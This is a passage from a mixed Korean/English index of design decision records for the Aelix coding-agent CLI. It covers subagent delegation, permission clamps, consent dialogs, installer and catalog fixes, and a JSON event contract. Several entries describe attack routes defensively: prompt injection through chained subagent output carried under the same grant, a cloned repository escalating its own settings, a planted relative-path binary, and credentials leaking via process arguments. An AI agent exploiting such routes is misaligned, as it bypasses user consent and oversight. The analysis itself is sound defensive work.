무증가(`core.py` 1개 유지) · `_SPAWN_ALLOWLIST` 무변경 · **`_PRODUCT_CORE_CAP_ALLOWLIST`도 무증가가 설계 선택** (모든 정직한 이름이 `_CAP_NAME_RE`에 걸리고, 이름 숨기기는 게이트의 존재 이유를 무력화·언더스코어는 조용히 면제 ⇒ 둘 다 **`None` 기본 파라미터**로 만들어 숫자를 밴드 3에 둠). **고치지 않은 것(의도)**: `agent_end`에 상관 id 없음 ⇒ 겹친 두 턴 구분 불가(한 위임이 다른 위임의 답·토큰·종료자를 `ok=True`로, 자기 작업 시간의 1/5 만에 반환 — 실측). **pi도 동일 결함**(`:429-432`, `:458-468`)이며 pi에선 한 클라이언트로 두 위임을 돌린 적이 없어 도달 불가였을 뿐. 버려진 턴이 `agent_start`도 함께 내보내므로 **클라이언트측 해결 불가** ⇒ 실제 방어는 서버 busy preflight + task당 자식 1개, **구속력: 동작하는 것처럼 보이기만 하는 클라이언트측 "수정" 금지**. **연기**: 채널 **선택기 없음**(설정 getter가 `get_features_agents`와 같은 **글로벌 스코프 전용**이어야 함 — merged read면 클론된 저장소가 제 `.aelix/settings.json`으로 채널을 고르는 동일한 자기권한상승, **오너 결정**) · **`tests/pi_parity` 픽스처의 `pi_file_loc` 4개 중 3개가 거짓**(`rpc-mode.ts` 492 기록 / 실제 754)이고 가드 테스트는 픽스처를 하드코딩 상수와 비교하는 **동어반복**(양쪽 다 pi를 안 읽음) — 7개 픽스처 전부 같은 감사 필요, ADR-0058 인용과 같은 부류이며 test-enforced parity pin으로 위장해 더 설득력 있어 **더 나쁨** · chain용 `steer`/`follow_up`. 실측: full suite **7146 passed / 1 skipped / 0 failed**(baseline 7103), 신규 테스트 45개, 변이 게이트 **18 mutations / 18 killed**, ruff clean. |
| 0200 | [Catalog fetch classification and the installer backend (W1-A)](0200-catalog-fetch-and-installer-backend.md) | Accepted (2026-07-31 — owner-ratified lane + merge; design record, lands with the W1-A impl) | **AELIX-ORIGINAL** (pi에는 marketplace·catalog·`extension install`·installer backend가 전혀 없음). 태그 전 필수 2건 동시 착지. **#111 A-1** — `classify_target()`이 `".git" in low`로 **URL 전체**를 부분매칭해 호스트 `handochan.`**`git`**`hub.io`가 git으로 오분류 ⇒ `DEFAULT_CATALOG_URL`이 `git+https://…/catalog.json`으로 정규화되어 JSON 문서를 `git clone` 시도 후 exit 2 ⇒ **기본 카탈로그가 out-of-the-box 100% fetch 불능**(유일 등록 소스이자 default-on; `raw.githubusercontent.com`도 동일 클래스). 기존 180개 catalog/install 테스트가 **전부 `.git` 없는 합성 호스트**(`_OFFICIAL = "https://official/catalog.json"`)를 써서 죽은 기능 위에서 green이었음 ⇒ 회귀 테스트는 리터럴이 아니라 **`DEFAULT_CATALOG_URL` 상수를 import해서** assert. 수정은 `urlsplit(...).path`에만 `.git` 판정(netloc 절대 불가) + trailing `/`·query 보존 위해 http 분기는 **삭제가 아니라 수리**; 5,760-URL 차분 스윕으로 변화는 **정확히 netloc에 `.git`이 있는 3클래스뿐, 역방향(pypi→git)은 공집합**. **#113** — `install.sh:165`의 `uv tool install` venv에는 **pip이 없어** `_pip_available` 가드가 **동의 프롬프트보다 먼저** exit 2 ⇒ README가 안내하는 공식 경로에서 모든 install/update 사망. `InstallBackend`(pip 우선 / uv 폴백 / 둘 다 없으면 실제 해법 명시 abort) 도입, `_pip_available`·`PipRunner`는 **기존 public seam 그대로 보존**(injected-runner 단락에 114개 테스트가 의존). **`uv pip download`가 존재하지 않으므로**(uv 0.11.14 실측) download→verify→local-install 경로는 uv에서 재현 불가 ⇒ `--require-signature`는 uv 백엔드에서 **fail-closed 거부**(조용한 미검증 진행 금지 = ADR-0187의 존재 이유). **리뷰가 잡은 자체 결함 2건이 본체보다 중요**: (1) `shutil.which("uv")`는 PATH에 상대 항목이 하나라도 있으면 **상대 경로**를 반환 ⇒ `node_modules/.bin/uv`를 심은 저장소에서 공격자 바이너리 실행 — `__post_init__`이 비절대 경로를 `ValueError`로 거부하고 bare-`uv` 폴백 2곳 제거; (2) 조직 index 핀 보존을 argv 번역으로 구현하면 `pip.conf`(0600)의 basic-auth 자격증명이 **`/proc/<pid>/cmdline`(0444)과 동의 블록**으로 유출 ⇒ 비밀은 **argv가 아니라 자식 env**(`UV_INDEX_URL`/`UV_EXTRA_INDEX_URL`)로 전달, 화면은 `_redact_auth`로 마스킹, pip 백엔드는 **env 미주입 + argv 바이트 불변**. 번역 정확도는 **실제 pip 24.0을 오라클로 세워 차분 검증**(파일 병합은 키 단위 덮어쓰기 — `extra-index-url` 누적 금지(폐기 미러 재유입 = dependency confusion) · 섹션 순서는 **병합 후 최종** 해석(per-file이면 조직 `[install]` 핀이 사용자 `[global]`에 짐) · `PIP_CONFIG_FILE`이 실재 파일이면 user config 스킵 · uv 억제는 env 4개가 아니라 `uv.toml`/`[tool.uv]`/`UV_CONFIG_FILE`까지). **ADR-0192의 opt-out 보존**: tombstone이 손상된 `git+…` 식별자로 저장돼 있어 순진한 수리는 **사용자가 끈 네트워크 요청을 조용히 되살림** ⇒ legacy 별칭 + stored row in-place 수리(early-return보다 앞서도록 dedupe와 1패스 병합), 별칭 범위는 **버그가 실제로 만들 수 있던 손상 클래스(netloc에 `.git`)로 한정**. 수정 후 **스위트가 실제 외부 HTTPS를 때리게 되어**(`_effective_default_identity`가 live URL 주입) `tests/conftest.py`에 `AELIX_DEFAULT_CATALOG=""` autouse fixture — 레인 밖 유일 편집이며 "수리가 만든 문제는 수리가 소유한다"로 승인. **#91(entry-point install이 팩의 `aelix-plugin.toml` 유실 ⇒ `contributes.*` 무음 inert)은 의도적 범위 밖 — 마켓플레이스는 #91 착지 전까지 "동작함"으로 공지 금지.** 프로토콜: 계획 사전 적대적 리뷰(2렌즈, blocking 2 — **계획서 §5 게이트 자체가 PYTHONPATH 누락으로 메인 레포를 임포트**) → 구현 → 검증 게이트 → 사후 리뷰(2렌즈) → 수정 → **수정 패스가 만든 미리뷰 ~500줄에 대한 델타 리뷰(2렌즈, blocking 1 = 위 자격증명 유출)** → 클로즈아웃. **기각된 발견 0건**, 제안된 *수정* 2건만 더 강한 것으로 대체. 실측 **7,102 → 7,245 passed / 1 skipped / 0 failed**, ruff clean, 신규 테스트 143개 전부 `tests/cli/`. 잔여: `_patched_environ`의 프로세스 전역 `os.environ` 변형(단일 스레드 전제) · ambient 값을 printable http(s)/file로 좁힘(pip보다 보수적, fail-safe) · `_uv_config_files`가 최근접이 아니라 조상 전체 수집 · 양쪽 행이 쌓인 사용자에게 죽은 `git+` row 잔존(표시상) · `UV_INDEX_URL` 실네트워크 미검증. |
| 0199 | [Parallel and chain delegation, and the governance that bounds it (P3)](0199-parallel-chain-and-delegation-governance.md) | Accepted (2026-07-28 — owner-ratified scope/topology/UI/stop story; design record, lands with the P3 impl) — **AMENDS ADR-0197 R2** (multi-task dialog preview 300 → 72), **R3 remains OPEN** | **AELIX-ORIGINAL** (pi에는 delegation topology·semaphore·batch cap·aggregate ceiling·per-prompt budget·batch consent dialog이 전혀 없음). spec §8 Phase 3 **items 1-2만** 착지; **items 3-4(long-lived `RpcChannel` + cross-channel parity)는 별도 스프린트로 연기** — 오너 결정이자 spec의 전제가 **실측상 거짓**이기 때문(진짜 `--mode rpc` 자식을 띄우는 테스트가 트리에 0개 — `tests/rpc`는 전부 `_build_argv`를 `python -c` 스텁으로 override; `rpc_client.py:466`은 mock-stream 데모인 `-m aelix`를 겨냥; `RpcClient.start()`에 P2 containment 전무(`start_new_session`/`pdeathsig`/reaper/bounded stderr 없음); `agent_end`는 abort·실패 prompt·busy 거절에서 미발사 — `rpc_mode.py`에 emit site 자체가 없음). 킥오프 자료 = `.omc/specs/rpc-sprint-kickoff-handoff.md` + 저널에서 복원한 recon 노트 2건(스크래치패드 유실 대비 4개 findings를 ADR 본문에도 재수록). **밴드**: kernel 0바이트 + **product-core delta ZERO** — fan-out은 Protocol 밖 private door `spawn_granted`로만; Protocol **member** 추가는 `bind_subagents`의 `runtime_checkable` hasattr 스윕(`api.py:669-679`) 때문에 기존 v1 서드파티 런타임을 **전부** bind 시점에 거절하므로 ADR-0197 §(b)의 version range는 **member에 대해서는 허구**(defaulted field에만 유효). 머지 후에도 살아남는 게이트로 Protocol member set frozenset 테스트 추가(+ `bind_subagents`의 하드코딩 튜플 소스 대조). **S3 = 1 profile × N tasks** — 보수적 선택이 아니라 **일관된 consent의 성립 조건**(모든 멤버가 같은 clamp/`consent_is_required`/`_may_widen`을 공유; `SpawnGrant`는 구조상 단수). **S4 = 호출당 dialog 1개, 배치 전체를 렌더** — 삭제된 session memo와 다른 종류(memo는 *나중* 호출을, batch는 훅이 이미 검증한 *이 한 호출*을 덮음). 한계량은 title이 아니라 **composed modal height** = `title + options + 4` vs `max(3, rows-6)`(`ctx.ui.select`는 title+options를 non-wrap·non-scroll 단일 Window로 합치고 `_CappedContainer`가 **바닥에서 잘라냄** ⇒ 마지막 옵션 = 항상 `Cancel`이 사라짐). **안 들어가면 REFUSE**(narrow 금지·프로세스 0·`SpawnGrant.reason`으로 모델이 읽는 별도 사유). 실측 80×24 수용량: parallel+widening **5**, widening 없으면 **6**, chain **5**(40행이면 20+). `BATCH_TASK_PREVIEW_CHARS=72`는 **ADR-0197 R2의 의도적 개정**(멀티태스크 한정, 단일은 300 유지) — Window가 wrap하지 않아 300자는 "완전해 보이면서" 조용히 잘리는 바로 그 실패. 구조적 정답(`approval_dialog`의 `Dimension.exact` 옵션창)은 product-core라 **R3는 OPEN 유지**. **거버넌스**: `MAX_CONCURRENCY=4`(대기·배치 단위) vs `MAX_LIVE_CHILDREN=4`(거절·세션 레지스트리)는 **서로 다른 두 경계**이고 `MAX_CONCURRENCY <= MAX_LIVE_CHILDREN`을 import 시점 `raise`로 강제(assert 아님 — `python -O`); 세마포어는 **loop별**·`async with`(모듈 전역 dict라 permit 누수는 영구적). budget은 **자식 단위**(호출 단위면 12×8=**96 children/prompt**; 근거 실측 0 dialogs/200 processes)이고 charge 지점을 door에서 `_run`의 **await-free admission block**으로 이동(P2에선 `_TOO_MANY_LIVE`마다 존재한 적 없는 자식에 예산을 씀). **남은 예산보다 큰 배치는 훅에서 CALL 자체를 거절**(dialog·프로세스 0) — S6와 S7이 만나는 유일 지점. "over-limit = 에러, truncation 아님"은 **세 갈래로 분리**: 오버사이즈 배치=malformed CALL(raise, 절대 앞 8개로 트림 안 함) / 런타임 거절=`ok=False` 엔벨로프 유지 / **50 KiB output cap은 명시적으로 범위 밖**(marker·`dropped_lines`·uncapped `details`가 있으므로 조용한 절단이 아님). **depth는 1 고정·설정 불가** — 올리려면 6개 메커니즘을 동시에 완화해야 하고(그중 2개는 depth 체크조차 아닌 `--no-agents` 무조건 append와 `narrow_tools`의 `AGENT_TOOL_NAME` 차감) bash env scrubber 없이는 여전히 advisory. **`{previous}`**: `summary` verbatim(marker 포함; `details`는 uncapped·비sanitize stderr tail을 실어 토큰비용과 주입면을 동시에 바꿈), 리터럴 토큰 + `{{previous}}` 단일 escape, escape 패스는 **구조적 split-rejoin**(escape가 token을 substring으로 포함해 2-pass replace는 양쪽 순서 다 오답), step 1 사용은 refused call, `MAX_TASK_BYTES=65536`(실측 E2BIG floor 131 072의 절반)은 **렌더된** 스텝에 재적용. **리뷰가 찾아낸 신규 주입 클래스**: chain step k≥2는 **사람이 본 적 없는**, 자식이 통화 중에 만든 텍스트를 **같은(경우에 따라 넓혀진) grant로** 받는다 — ADR-0197 R2가 아니라 **새 클래스**(R2의 3개 완화는 전부 "사람이 화면에서 읽는 텍스트"에만 작동). 완화 3종: fence + fence-forgery escape(`&lt;`, homoglyph 금지), dialog의 고지 행 1줄, chain에서 `_may_widen=False`(allow-list `{"single","parallel"}` — deny-list면 이후 추가되는 topology가 기본으로 rung을 얻음). `consent_is_required`는 의도적으로 `mode`를 받지 않음(받으면 rung이 아니라 **dialog 자체**가 사라져 8단 chain이 무인 시작). 잔여 **R-A**: chain의 후속 스텝은 consented text가 아니다 — 완전한 답은 child→parent per-tool approval back-channel(별도 스프린트). **취소**: `ctx.signal`은 전 경로에서 죽어 있어(`core.py:4276-4282`→`loop.py:107`→`:612`) `CancelledError`가 유일 채널 ⇒ `gather(return_exceptions=False)`를 executor 자기 프레임에서 await + **모든 멤버 본문을 guard**(`except CancelledError: raise` / 그 외는 엔벨로프) — `gather`는 non-cancel 예외에 형제를 취소하지 않고, `write_prompt_file`이 `PrintChannel.run`의 `try` **밖**에 있어 그 경로는 실제로 도달 가능. aggregate ceiling은 `wait_for`가 아니라 **남은 예산에서 각 멤버의 timeout을 유도**(`wait_for`는 완료된 엔벨로프까지 파괴), `MAX_BATCH_WALL_MS = MAX_TIMEOUT_MS = 30분`(쪼개기/합치기로 시간을 더 살 수 없게 의도적 동일), `KILL_LEG_RESERVE_MS=7000`을 빼서 **선언한 상한이 실제 상한**. **§3.9 정정**: live posture floor는 무조건 rank-min이 아니라 "배치 시작 시점 clamp보다 **더 타이트해졌을 때만**" — 무조건형은 사람이 명시적으로 준 widening을 매 배치마다 취소함. **UI 3면**(수명 3종): 집계 statusline 1행(height-1 row에 per-child 4개면 ~186자) · `on_partial` 툴카드 N행(영구 기록, N=1이면 P2와 바이트 동일) · `set_widget` 패널(N≥2에서만). 커널이 `on_partial`마다 prune 없는 Task를 쌓고 `loop.py`는 편집 불가라 **500 ms throttle이 유일한 합법 완화**(EMIT만 제한, INGEST는 절대 아님). `progress.py`의 "set_widget은 P4" 문장은 삭제가 아니라 **정정**(패널의 일정 이야기였고 P4의 목표는 multi-pane 대시보드). 상관관계는 contract field 없이 **tap 순서 보장**(`_publish`의 `for tap in (on_event, host.on_progress)` 사이에 await 없음) + 멤버 생성 시 바인딩된 index + `begin_group(key, expected=N)`으로 해결(spawn id는 `_run` 내부에서 주조되므로 id 목록으로 group을 열 수 없음). **S11 = mid-turn stop overlay 없음**(Ctrl+C가 탈출구) — 실측 근거: 델리게이션 중 `chrome.py:746`이 **`/`로 시작하는 텍스트 포함** 모든 Enter를 steer()에 **메시지로** 넘겨 REPL이 사실상 읽기 전용 ⇒ aggregate ceiling이 락아웃의 유일한 경계이고 shift+tab이 유일한 레버. **S9 밴드 게이트**: product-core가 선언해도 되는 cap-like 상수의 **정확한 집합**(4개) + P3의 9개 cap 이름이 product-core에 **binding position**으로 등장 금지 — `AnnAssign`·비리터럴 RHS·패키지 전체를 커버하고 **mutation-verified**(probe 모듈 투입 시 2 failed, 제거 시 6 passed). 잔여: R-A(chain 후속 스텝 미승인) · R-B(ADR-0197 R3 OPEN, 압력 증가) · R-C(abort 비용이 N에 비례 — 실측 36 pids에서 `descendant_pids` 2.4 ms / `pipe_holder_pids` 5.2 ms, ~400 pids면 4-member abort가 100-350 ms 루프 블록) · R-D(취소된 자식의 reaper task 고아화 ×N) · R-E(배치 멤버와 동시 `/agents run` 자식 구분 불가) · R-F(긴 배치 *도중*의 identity 스왑 미탐지) · R-G(버스 구독자는 그룹 없이 N개 start를 봄). 실측: full suite **6913 passed / 1 skipped / 0 failed**, `tests/agents_ext`+`tests/agents` **1252 passed**(baseline 1023), 신규 테스트 163개. |
| 0198 | [Print-mode JSON event-envelope stability contract (`--mode json`)](0198-print-mode-json-envelope-contract.md) | Accepted (2026-07-26 — lands with the P2 impl) | `--mode json`의 이벤트 wire shape를 처음으로 계약화. **커널 dataclass = 보이지 않는 wire format** (`print_mode.py:161` → `_dataclass_to_dict` = `dataclasses.asdict`) ⇒ **snake_case** (`stop_reason`/`error_message`/`cache_read`/`tool_name`·`input`; pi의 camelCase 파서를 그대로 포팅하면 전부 `None`으로 조용히 읽힘). **`usage` 는 그 보장에서 명시적으로 제외** (`messages.py:127` = `dict[str, Any]`; 커널 자신이 `compaction.py:1036-1043`에서 dual-read) ⇒ 소비자는 반드시 dual-read + `null` 허용. 첫 줄은 **`type` 없는** 세션 헤더이고 best-effort라 유무를 모두 가정 금지 ⇒ `event.get("type")`. `message_update`는 O(n²)(실측 329×·2773×)이므로 무시하고 `message_end`로 누적, `agent_end`는 terminator. **JSON 모드는 assistant 에러에도 exit 0** (`stop_reason: "error"`), 기동 실패는 **stdout 0바이트** ⇒ 실패 판정은 exit code 단독 불가 + stderr rung 필수(sanitize). **평범한 `message_end`가 asyncio `readline()`의 64 KiB 한계를 초과**(199 246바이트 read → ~207 KB, 이후 모든 `readline()`이 복구 불가 raise) ⇒ 전송은 chunked + 양쪽 파이프 동시 pump(순차 drain은 실측 데드락). `SubagentResult`는 **defaulted 필드만** 추가 → 버전 미증가. `tests/cli/test_print_mode_json_contract.py` 의무화 — **P2 리뷰에서 부재가 확인되어 실제로 작성**(진짜 자식 프로세스의 stdout을 실제 파이프로 소비; camelCase 이름 변경 주입 시 6개 assertion 실패, 기존 `test_print_mode.py`는 그대로 green). D7의 "첫 줄은 `type` 없음"은 **정정**: 헤더는 `session is not None`일 때만 나오고 subagent는 `--no-session`이라 첫 줄이 `agent_start` — 소비자 규칙(`event.get("type")`, 0번 인덱싱 금지)은 동일. rpc 절반 + cross-channel parity 테스트는 P3. |
| 0197 | [Subagent-runtime seam & the bundled `aelix-agents` extension (P2)](0197-subagent-runtime-seam-and-aelix-agents.md) | Accepted (2026-07-26 — owner-ratified authority posture (Option C); design record, lands with the P2 impl) — **AMENDED 2026-07-27 (owner)**: §(i) consent dialog은 **쓰기 권한이 실제로 걸려 있을 때만** 뜨고, widening 옵션은 **프로필이 스스로 쓰기 권한을 선언했을 때만** 제시된다 (R7) | **AELIX-ORIGINAL** (pi `pi-subagents`는 *shape* 레퍼런스일 뿐 — clamp·consent·depth guard·cap·roster·timeout 모두 pi에 없음). **3밴드**: kernel 0바이트(실측 grep 0 hits, CI content gate) · product-core = **CONTRACT ONLY**(`subagent_contract.py` + `bind_subagents`/`unbind_subagents`; 스폰·argv·스트림 파싱·consent 정책 전부 금지) · 번들 extension `aelix_agents` = 스폰 구현 전부. 버전은 **RANGE**(`MIN_SUPPORTED_CONTRACT_VERSION`; defaulted 필드 추가는 미증가) + `bind_subagents` **4중** 거절(version / double-bind / **depth** / **shape** — `contract_version`은 self-declared라 shape를 증명하지 못했고, `runtime_checkable` `SubagentRuntime`은 쓰이지 않고 있었음; 실측으로 한 개 속성짜리 stub이 bind되어 소비자가 `.list()`에서 AttributeError). `/agents run`은 product-core built-in — spec §6.3의 `register_command("run", …)`은 **구현 불가**(`shell.py:2452-2459` + `command_dispatch.py:76-85`). **depth guard는 Phase 3에서 pull-forward한 GUARD**(하드코딩 `MAX_SUBAGENT_DEPTH = 1`, 프로필 필드/설정/플래그 없음), 그리고 **`role`은 MAX=1에서 산술적으로 inert**. **권한**: 헤드리스 자식은 원래 모든 mutating tool을 auto-allow(`permission.py:382-383`) → 스포너가 전순서 **CLAMP**로 posture를 계산(DEFAULT 부모 + `approval_mode: auto` → **`plan`**), project-scope widening ban은 **rank-MIN**(assignment 형태는 실측상 YOLO 부모에서 repo 프로필을 사용자 프로필보다 *더 넓게* 만들었음), `headless_default`는 belt일 뿐(`:348-353`이 위에서 return). `ctx.has_ui`는 mode가 아니라 **시간 가변**(`api.py:957`/`:977-978`) ⇒ 캐시 금지. **spawn-time consent(§(i))**: 게이트가 비어 있었음(`"agent" ∉ _MUTATING`, `_rule_key`는 args-blind) → `tool_call` 훅에서 부모가 사람에게 물음, grant는 `tool_call_id`로 1회 pop(훅 우회 시 스폰 불가), widening은 **project scope 절대 불가 · 상한 정확히 `auto-accept-edits` · 영속화 없음 · 세션 메모도 없음**. **Amendment (2026-07-27, owner)**: dialog은 **쓰기 권한이 실제로 걸려 있을 때만** 뜬다 — `consent_is_required(...)` = `grants_write_authority(clamped) or _may_widen(...)`. 술어는 `clamped is PLAN` 하드코딩이 아니라 **실제 ladder에서 유도**(`>= AUTO_ACCEPT`; `default`는 branch (d)에서 block되므로 no-authority 쪽) 하고 실제 `PermissionExtension`으로 테스트 고정. **같은 날 2차 개정**: widening은 **프로필이 스스로 선언한 경우에만** 제시 — `_may_widen` **constraint 0** = `declares_write_authority(approval_mode)`, `auto`/`ask`=선언, `inherit`/`deny`=비선언(`deny`는 절대 widen 불가), 미지값은 allow-list라 fail-closed. 이유: 1차 개정만으로는 **평범한 read-only user-scope delegation이 여전히 모달을 띄웠다**(사람이 이론상 넓힐 수 있다는 이유만으로). 실측 60개 live-UI 셀 기준 프롬프트 수 **60 → 49 → 35**(2차에서 줄어든 14개 = user/explicit scope의 `inherit`·`deny` 중 clamp가 무권한인 셀). 두 도어(`_grant_for` 프리필터 + dialog early-out)는 이제 **동일 함수** `consent_is_required` 호출 — 이전의 서로 다른 두 표현은 실제로 2개 셀에서 불일치했음. 근거: **선택지가 없는 모달은 click-through를 학습시켜, 정작 중요한 프롬프트를 위태롭게 한다**; 권한은 *선언된* 의도를 따르고, 쓰기를 주는 방법은 리뷰·서명 가능한 프로필 파일을 고치는 것. project identity 게이트는 그대로(모델 도어 `allow_project=False` 하드코딩 · `/agents run`은 `_confirm_project_agent_for_run` 후에만 `allow_project=True` — 소스 트리 유일 호출부). 잔여 R7: read-only delegation은 이제 per-spawn 사람 확인 없이 진행되며, clamp · `MAX_DELEGATIONS_PER_PROMPT`/`MAX_LIVE_CHILDREN` · statusline/`subagent_*` 이벤트가 대신 경계를 만든다. **세션 메모 없음 결정은 불변**. 전제조건으로 **`.aelix`가 `_SENSITIVE_DIR_COMPONENTS`에 추가**(실측: 4개 제어 파일이 모두 auto-allowable였음) — **사용자 가시적 동작 변경, CHANGELOG**. child project trust는 **2절 규칙**(같은 cwd + gate 대상 부재 → 무플래그로 `inherit_skills: true` 기본값 보존; 그 외 = 모델이 고른 cwd → `--no-approve`로 monorepo 조상 `trust.json` 에스컬레이션 차단). **P2 리뷰(2026-07-26) 반영**: consent는 **allow-list**로 fail-closed(제시되지 않은 답변이 clamp에서 GRANT였음 — 실측 `parent=yolo -> child_mode=yolo`), **delegation budget** 추가(`MAX_DELEGATIONS_PER_PROMPT=12` 모델 도어 한정 · `MAX_LIVE_CHILDREN=4` 양쪽 도어 — 실측 0 dialog / 200 child), identity 재검증을 **live 게이트**로 전환(기존 비교는 구조상 항상 동일 = dead), project-scope 거절을 **typed**(`ProjectScopeRefused`; 기존은 한 구현만 만드는 문구 substring), prompt 파일 **4번째 소유자**(pid 각인 + `sweep_stale_prompt_dirs`; 부모 SIGKILL 시 0600 파일 영구 잔존 실측 4/4), pipe EOF≠exit status(`POST_EOF_EXIT_GRACE_SECONDS`), `proc.terminate()` 금지(실측 exit 255 60/60 → `os.kill`), `--no-agents` sticky, seam takeover 시 stand-down. **PDEATHSIG SIGKILL 제안은 REJECT**(실측: SIGTERM=손자 정리됨 / SIGKILL=손자 생존) — 잔여 위험은 §(j)에 명기, 완전 격리는 P3. `tests/cli/test_print_mode_json_contract.py` 실제 작성(진짜 자식 프로세스 소비). reaper는 **반복 취소 안전**(Ctrl+C running 분기 `chrome.py:863-866`에 디바운스 없음) + `killpg` 논거 정정(`bash.py:163` 손자는 자기 그룹) + PDEATHSIG. **P3 연기**: child→parent approval back-channel(4개 실측 차단 사유), 영속 consent, bash env scrubber, parallel/chain, `RpcChannel`, keyed registry, cgroup 격리. **ADR-0008 AMEND**; ADR-0196/0165/0157에 NOTE. |
| 0196 | [Agent-profile format & single-agent invoke (P1)](0196-agent-profile-format-and-single-agent-invoke.md) | Accepted (2026-07-19 — owner-ratified; design record, lands with the P1 impl) | **AELIX-ORIGINAL** (pi has an `agents/<name>.md` role file but no profile *concept*). 단일 `<name>.md` = YAML frontmatter + body 프로필 포맷 · discovery (`~/.aelix/agent/agents` user + trust-gated `<cwd>/.aelix/agents` project) · **effective-scope-by-containment** (`--agent-file`로 project 프로필을 세탁 불가) · 순수 `profile_to_flags`/`profile_to_argv` resolver (3-plane anti-drift 테스트로 `apply_profile_to_args`와 핀) · `--agent`/`--agent-file` · `--system-prompt-file`/`--append-system-prompt-file` (기존 플래그는 literal string → `ARG_MAX`/`ps` 누출) · `Args.provided` 명시-CLI provenance · `/agents list\|show\|use`. **Nothing spawns** — `subagent_contract.py`/`bind_subagents`/`agent` tool은 P2. Kernel byte-unchanged. **선행 결함 3건 동반 수정**: trust predicate가 `.aelix/agents/`를 몰라 project 프로필 게이트가 실측 no-op였음 · `--no-builtin-tools` parsed-but-ignored → post-registration 필터 (`--no-tools` 가드 + `ALL_TOOL_NAMES`, reload step-6 생존) · `--thinking` parsed-but-unconsumed (writer 1 / reader 0) → `AgentHarnessOptions.thinking_level` 배선. 포맷 정정: `model: inherit`→`None`, `tools: []`≠absent(전자는 `--no-tools`), skills/extensions는 **name이 아니라 PATH**, `skills: none` 센티넬 폐기 → `inherit_skills: bool = true`. `/agents use` = **Option D** (pristine baseline 리셋 + `parsed` 오버레이 + live public-state apply; 리빌드/리로드 없음). 의도적 연기(사유 기록): 0600 temp-prompt writer · `confirm_project_agents` settings key · `[features] agents` 기본-off 플래그. ADR-0008 **AMEND**. |
| 0193 | [#39 + #81 — `@file` fuzzy whole-tree + quoted mentions · large-paste collapse](0193-issue39-81-file-fuzzy-paste-collapse.md) | Accepted (2026-07-12 — shipped) | Resolves ADR-0121 §Deferred. **#39**: `@file` completer upgraded to fuzzy whole-tree subsequence search — `fd` when on PATH (`.gitignore`-aware) else a bounded `os.walk` fallback (owner-confirmed: fd = speed upgrade only, keeps dependency-free/air-gap posture), a shared `_EXCLUDE_DIRS` predicate on BOTH enumerators (fd & walk match the same set regardless of `.gitignore`), TTL-cached + capped enumeration, `ThreadedCompleter` so a big tree / stalled fd can't freeze the UI, and quote-aware `@"path with spaces"` parsing. NO user input to the subprocess. **#81**: large bracketed paste collapses in the editor to `[Pasted text #N +M lines]` (owner-confirmed: input box only — transcript+model get full text); single-pass-regex expand at submit; immediate identical re-paste REPLACES the placeholder (reveal, no double-send); monotonic `#N`, bounded non-live-only eviction; `get_editor_text()` expands so Ctrl+G/dequeue edit real content. Adversarial review (6 lenses / 23 agents) → 15 findings all fixed (1 HIGH reveal double-send, 3 MEDIUM). |
| 0192 | [#76 Beta Release Track + Default Marketplace Catalog (opt-out, signed)](0192-issue76-default-catalog-opt-out.md) | Accepted (2026-07-10 — #76 beta; design record, lands with impl) | #76 첫 공개 릴리즈 = **베타**: `curl\|sh` + GitHub Releases 채널(PyPI는 GA로 연기, hyphen-tag 게이트) + 서명·opt-out 기본 마켓플레이스 카탈로그. ADR-0188 §4(c) 세 금지 중 **(iii) 등록 deny-by-default만 부분 대체** → opt-out(지속 identity tombstone `suppressed_default_catalogs`: `source remove`가 기록·`source add --catalog`가 해제; `--no-default-catalog`/빈 env는 이번-run ephemeral). **(i) URL 하드코딩 금지**·**(ii) 자동fetch/자동discover 금지**는 가드레일 ①②④로 유지, 공식 카탈로그는 fail-closed Ed25519 문서 서명(⑤). ADR-0005 재해석(require≠default), ADR-0187/0188/0189 불변식 보존. |

### Sprint 6h₆ sub-table (Phase 5a-i + 5a-ii closure — Aelix non-interactive CLI entrypoint — **B 단계 OPENS**; **RPC roster STAYS CLOSED**)

Counts UNCHANGED at **29 supported / 0 deferred / 29 total**. The CLI
shell does not change the RPC dispatch table. Sprint 6h₆ ports the
non-interactive half of Pi `main.ts` (716 LOC reduced) + `cli/args.ts`
(354 LOC hand-rolled linear parser) + `cli/file-processor.ts` (text
branch only) + `cli/initial-message.ts` (Pi `.shift()` mutation
preserved) + `modes/print-mode.ts` (158 LOC 9-step lifecycle) + a
new `[project.scripts] aelix` console-script entry. Interactive mode
raises :class:`NotImplementedError` with a stderr diagnostic pointing
to ADR-0088 (Phase 5b TUI library selection deferred). W4/W5 audit
returned **0 BLOCKING + 4 MAJOR + multiple MINOR/NIT** triage items;
W6 closed all 4 MAJORS plus the W4 MAJOR `print_help` typing upgrade
and shipped 3 Pi-parity regression tests (P-396 / P-397 / P-398).

| Item | Status | Owner ADR |
|---|---|---|
| 6h₆ | Phase 5a-i + 5a-ii | non-interactive CLI entrypoint | RPC roster UNCHANGED (29 / 0 / 29) | ADR-0088, ADR-0089 |
| `aelix_coding_agent.cli.config` (`APP_NAME = "aelix"` Aelix-additive divergence + `VERSION = "0.1.0"`) | shipped | ADR-0089 |
| `aelix_coding_agent.cli.args` (Pi `cli/args.ts` 354 LOC hand-rolled linear parser; 30+ flags; `Args` dataclass with `messages` + `file_args` + `unknown_flags` + `diagnostics`; `argparse` / `click` rejected per P-386 — cannot cleanly express 3 Pi-specific parser features) | shipped | ADR-0089 |
| `aelix_coding_agent.cli.file_processor` (Pi `cli/file-processor.ts` text branch; image branch deferred to 5a-iii pending `image-resize` + provider-agnostic ImageContent shape) | shipped | ADR-0089 |
| `aelix_coding_agent.cli.initial_message` (Pi `cli/initial-message.ts` with `.shift()` side effect on `parsed.messages` preserved per P-388) | shipped | ADR-0089 |
| `aelix_coding_agent.modes.print_mode` (Pi `modes/print-mode.ts` 158 LOC 9-step lifecycle: signal handlers → set_rebind_session → JSON header → initial rebind → initial-message prompt → residual messages loop → text-mode terminal printout → cleanup) | shipped | ADR-0089 |
| `aelix_coding_agent.cli.entry.main_sync` + `_async_main` (Pi `main.ts:96-113` + `:423-716` reduced for non-interactive scope; lifecycle steps 1-12) | shipped | ADR-0089 |
| `aelix_coding_agent.__main__` (wires `python -m aelix_coding_agent` to `main_sync`) | shipped | ADR-0089 |
| `[project.scripts] aelix = "aelix_coding_agent.cli.entry:main_sync"` (console script entry) | shipped | ADR-0089 |
| `--print` `---` triple-dash escape (W6 P-396 MAJOR — Pi `args.ts:123-129` inline predicate; `aelix --print ---rule line` flows positionally instead of being treated as a flag) + new regression test `test_print_with_triple_dash_message` | shipped | ADR-0089 |
